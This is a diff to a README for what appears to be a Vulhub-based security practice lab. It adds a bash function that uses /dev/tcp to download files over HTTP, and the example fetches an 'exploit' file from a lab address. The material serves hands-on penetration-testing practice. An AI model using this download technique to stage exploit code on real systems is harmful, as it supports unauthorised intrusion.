@@ -30,3 +30,27 @@ Be certain to add the following to your /etc/hosts file:
 ```
 
 Modify for your own needs! Thanks to Vulhub: https://github.com/vulhub/vulhub
+
+## Tips
+
+To use bash to retrieve a file via HTTP create this function (just copy and paste this into a terminal):
+
+```
+_get ()
+{
+  IFS=/ read proto z host query <<< "$1"
+  exec 3< /dev/tcp/$host/80
+  {
+    echo GET /$query HTTP/1.1
+    echo connection: close
+    echo host: $host
+    echo
+  } >&3 
+  sed '1,/^$/d' <&3 > $(basename $1)
+}
+
+```
+
+Then you can use it like this:
+
+```$ _get http://10.1.1.14/exploit```
